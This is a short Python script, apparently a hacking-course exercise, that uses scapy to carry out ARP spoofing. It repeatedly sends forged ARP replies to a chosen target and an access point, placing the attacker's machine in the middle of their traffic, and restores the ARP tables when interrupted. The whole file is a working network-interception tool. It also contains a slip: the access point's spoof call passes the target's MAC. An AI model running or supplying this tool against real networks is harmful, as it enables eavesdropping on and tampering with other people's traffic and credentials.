#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse
import sys
from scapy.layers.inet import IP, UDP, TCP, ICMP

### function to parse the arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest = "target",help ="Target IP/ IP range.")
    parser.add_argument("-a","--access-point",dest="access_point",help = "Access Point IP.")
    options = parser.parse_args()
    return options

### function to get the mac address of the target
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answerd_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]
    return answerd_list[0][1].hwsrc
    
### Fool the target
def spoof(target_ip, spoof_ip,target_mac):
    packet = scapy.ARP(op = 2,pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destionation_ip, source_ip, destination_mac,source_mac):
    packet = scapy.ARP(op = 2, pdst=destionation_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,verbose=False)
    

### Get the arguments passed by the user
options = get_arguments()
    ### Get the mac address of the target computer

try:
    target_mac = get_mac(options.target)
    source_mac = get_mac(options.access_point)
except IndexError:
    print("[-] Specified IP's are not present in the network")
    sys.exit()


### Loop to keep sending packets to both the target and the access point
ct = 0
try:
    while True:
        ct+=2
        spoof(options.target,options.access_point,target_mac)
        spoof(options.access_point,options.target,target_mac)
        print("\r[+] Packets sent: " + str(ct),end="")

        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Program terminted by user")
    ## Restore the arp table
    restore(options.target, options.access_point, target_mac, source_mac)
    restore(options.access_point, options.target, source_mac, target_mac)
    print("[+] Restored arp tables")


